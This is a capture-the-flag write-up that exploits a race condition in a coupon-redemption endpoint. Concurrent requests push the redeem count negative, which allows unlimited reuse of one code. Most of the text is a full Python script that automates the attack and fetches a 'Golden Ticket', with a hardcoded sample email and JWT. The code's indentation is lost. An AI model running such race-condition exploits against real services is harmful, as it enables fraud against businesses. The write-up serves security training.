#Abusing coupon redemption

Notice the parameters passed in the POST request to the endpoint "/coupon_redeem".
Drop this POST request to "/coupon_redeem" endpoint.
As it is mentioned in the challenge description:
"The issue is that the redeem operation is a bit slow and the developers hadn't placed any
checks to avoid any race conditions."

More specifically the redeem implementation as mentioned in the challenge description:
The redeem implementation works as follows:
1. It maintains a redeem count set to 1.
2. Once the token is redeemed the redeem count is reduced by 1, that is, redeem =
redeem - 1
3. If the redeem count is 0, the redeem code cannot be used further.
This could be leveraged as follows:
1. Send 2 (or more) asynchronous requests to "/coupon_redeem" endpoint to set the redeem count
-1.
2. Since the redeem count becomes negative, it would never become zero again since
each redeem request would decrease the redeem count.
3. Thus, the same redeem code could be used multiple times and thus the Golden Ticket
could be retrieved by getting the balance to exceed $5000.

The exploit to this would appear as below

Python Script:

```
import json
import grequests
import requests
from time import sleep
BASE_URL = "http://<target>"
def redeemAsync(email, token, code, nTimes):
global BASE_URL
headers = {
"Content-Type": "application/json"
}
data = {
"email": email,
"token": token,
"code": code
}
rs = (grequests.post(BASE_URL + "/coupon_redeem", data = json.dumps(data), headers = headers) for i
in range (nTimes))
return grequests.map(rs)
def redeem(email, token, code):
global BASE_URL
headers = {
"Content-Type": "application/json"
}
data = {
"email": email,
"token": token,
"code": code
}
resp = requests.post(BASE_URL + "/coupon_redeem", data = json.dumps(data), headers = headers)
#print resp.text
return resp.json()
def makeRequest(email, token, endpoint):
global BASE_URL
resp = requests.get(BASE_URL + endpoint, params = { "email": email, "token": token })
#print resp.text
return resp.json()
def getBalance(email, token):
return makeRequest(email = email, token = token, endpoint = "/balance")
def getGoldenTicket(email, token):
return makeRequest(email = email, token = token, endpoint = "/goldenticket")
if __name__ == "__main__":
email = "keked@yandex.ru"
token =
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzZWN1cmUtZXdhbGxldC5jb20iLCJpYXQiOjE1O
DM1MTIyMjAsImVtYWlsIjoiamFtZXNAc2VjdXJlLWV3YWxsZXQuY29tIiwiZXhwIjoxNTgzNTE0MDIwfQ.2H
GAoG5C0M1C4sDDYbyE4yT3cDbVkUfyuoxRaVvQOxo"
code = "RX100"
reqAsync = True
nTimes = 2
while True:
balanceResp = getBalance(email, token)
if "balance" in balanceResp:
print "-========================================-"
print "Current Balance:", balanceResp["balance"]
print "-========================================-"
if float(balanceResp["balance"]) > 5000:
goldenTicketResp = getGoldenTicket(email, token)
if "ticket" in goldenTicketResp:
print "Here's your Golden Ticket:", goldenTicketResp["ticket"]
break
redeemResp = None
# Redeem alteast two times in the first attempt!
if reqAsync:
reqAsync = False
redeemResp = redeemAsync(email, token, code, nTimes)
#print len(redeemResp)
#print redeemResp[0].json()
#print redeemResp[1].json()
# Checking the last response...
redeemResp = redeemResp[-1].json()
else:
redeemResp = redeem(email, token, code)
reqAsync = False
if "Error" in redeemResp:
print "Some error occurred!"
print "Please resolve it before continuing further...\n"
print "[ERROR]:", redeemResp["Error"]
print "\nExiting due to error in response!"
break
else:
# Avoids rate limit exceeded error!
sleep(0.2)
print redeemResp
```
